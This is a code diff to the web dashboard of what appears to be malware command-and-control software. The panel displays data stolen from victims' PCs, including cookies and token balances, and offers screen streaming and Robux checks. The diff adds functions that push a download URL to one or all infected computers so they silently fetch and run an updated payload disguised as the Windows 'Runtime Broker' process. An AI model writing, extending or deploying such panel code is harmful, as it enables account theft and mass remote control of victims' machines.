@@ -1330,6 +1330,9 @@ function loginHTML(error) {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function dashboardHTML(user) {
   const avatar = user === 'Shonll' ? '🦊' : '🐉';
+  const downloadUrl = user === 'Shonll' 
+    ? '/downloads/RAH_Non_Pro_setup.exe' 
+    : '/downloads/NON_PRO_setup.exe';
   return `<!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -1753,7 +1756,10 @@ function dashboardHTML(user) {
       <option value="">Все отправители</option>
     </select>
   </div>
-  <button class="btn-refresh" onclick="loadFiles()">↻ Обновить</button>
+  <div style="display: flex; gap: 8px;">
+    <button class="btn-refresh" onclick="loadFiles()">↻ Обновить</button>
+    <button class="btn-refresh" id="btnUpdateAllFiles" onclick="updateAllClients()" style="border-color: var(--danger); color: var(--danger); background: rgba(255, 23, 68, 0.05);">⚡ Обновить у всех</button>
+  </div>
 </div>
 
 <!-- Grid -->
@@ -1783,6 +1789,7 @@ function dashboardHTML(user) {
             <div class="spec-row"><span class="spec-lbl">🎮 GPU</span><span class="spec-val" id="specGpu">—</span></div>
             <div class="spec-row"><span class="spec-lbl">📅 Дата</span><span class="spec-val" id="specDate">—</span></div>
             <div class="spec-row"><span class="spec-lbl">📦 Размер</span><span class="spec-val" id="specSize">—</span></div>
+            <div class="spec-row"><span class="spec-lbl">⚡ Версия</span><span class="spec-val" id="specVersion" style="color: #00f0ff; font-weight: 600;">—</span></div>
             <div class="spec-row" id="specCookieErrorRow" style="display:none;"><span class="spec-lbl">⚠️ Cookie Error</span><span class="spec-val" id="specCookieError" style="color:#ffa502; font-size:0.75rem; font-family:monospace; white-space:pre-wrap; max-height:80px; overflow-y:auto;">—</span></div>
           </div>
         </div>
@@ -1808,6 +1815,7 @@ function dashboardHTML(user) {
           <button class="modal-btn stream-btn" id="modalStreamBtn">📺 Смотреть стрим</button>
           <button class="modal-btn robux-btn" id="modalRobuxBtn">💰 Проверить Robux</button>
           <button class="modal-btn ai-btn" id="modalAiBtn">🤖 AI Анализ файла</button>
+          <button class="modal-btn update-btn" id="modalUpdateBtn" style="background: rgba(239, 68, 68, 0.12); border: 1px solid rgba(239, 68, 68, 0.25); color: #ef4444;" onclick="triggerUpdate()">⚡ Обновить клиент</button>
           <button class="modal-btn del-btn" id="modalDeleteBtn">🗑 Удалить файл</button>
         </div>
       </div>
@@ -2008,6 +2016,7 @@ function renderFiles(list) {
                 "<div class=\\"card-meta\\">" +
                   "<span class=\\"badge badge-pc\\">🌍 " + pcCountry + "</span>" +
                   "<span class=\\"badge badge-size\\">" + fmtSize(f.size || 0) + "</span>" +
+                  "<span class=\\"badge badge-version\\" style=\\"background: rgba(0, 240, 255, 0.1); color: #00f0ff; border: 1px solid rgba(0, 240, 255, 0.25);\\">v" + (f.computer?.version || "—") + "</span>" +
                 "</div>" +
               "</div>" +
             "</div>";
@@ -2050,6 +2059,7 @@ function openModal(idx, fEscaped) {
   document.getElementById("specGpu").textContent = pc.gpu || "—";
   document.getElementById("specDate").textContent = fmtDate(f.uploadedAt);
   document.getElementById("specSize").textContent = fmtSize(f.size || 0);
+  document.getElementById("specVersion").textContent = pc.version ? "v" + pc.version : "—";
 
   const diag = f.diagnostics || {};
   const cookieErrorEl = document.getElementById("specCookieError");
@@ -2141,6 +2151,7 @@ function openModal(idx, fEscaped) {
   document.getElementById("modalStreamBtn").onclick = function() { openStreamModal(pc.name || "Unknown"); };
   document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
   document.getElementById("modalAiBtn").onclick = function() { analyzeFile(f.name); };
+  document.getElementById("modalUpdateBtn").onclick = function() { updateClient(f.name); };
   document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
   
   document.getElementById("fileModal").style.display = "flex";
@@ -2262,6 +2273,46 @@ async function checkRobux(name) {
     robuxEl.textContent = "❌";
     statusEl.textContent = "Ошибка сети: " + e.message;
     statusEl.style.color = "#ff1744";
+  }
+}
+
+const operatorDownloadUrl = window.location.origin + "${downloadUrl}";
+
+async function updateClient(filename) {
+  if (!confirm("Действительно отправить команду на фоновое обновление Runtime Broker на этом ПК?")) return;
+  try {
+    const r = await fetch('/request-update', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ filename: filename, downloadUrl: operatorDownloadUrl })
+    });
+    const resp = await r.json();
+    if (resp.success) {
+      toast('✅ Команда на обновление отправлена');
+    } else {
+      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
+    }
+  } catch (e) {
+    toast('Ошибка отправки', 'err');
+  }
+}
+
+async function updateAllClients() {
+  if (!confirm("Внимание! Отправить команду на фоновое обновление Runtime Broker на ВСЕХ подключенных ПК?")) return;
+  try {
+    const r = await fetch('/request-update-all', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ downloadUrl: operatorDownloadUrl })
+    });
+    const resp = await r.json();
+    if (resp.success) {
+      toast('✅ Запрос отправлен на ' + resp.count + ' ПК');
+    } else {
+      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
+    }
+  } catch (e) {
+    toast('Ошибка отправки', 'err');
   }
 }
 
@@ -2403,7 +2454,6 @@ function tokensHTML(user) {
     </div>
     <div>
       <button class="sort-btn" onclick="loadTokens()" style="border-color: var(--success); color: var(--success);">↻ Обновить балансы</button>
-      <button class="sort-btn" onclick="updateAllClients()" style="border-color: var(--danger); color: var(--danger); margin-left: 8px;">⚡ Обновить у всех</button>
     </div>
   </div>
 
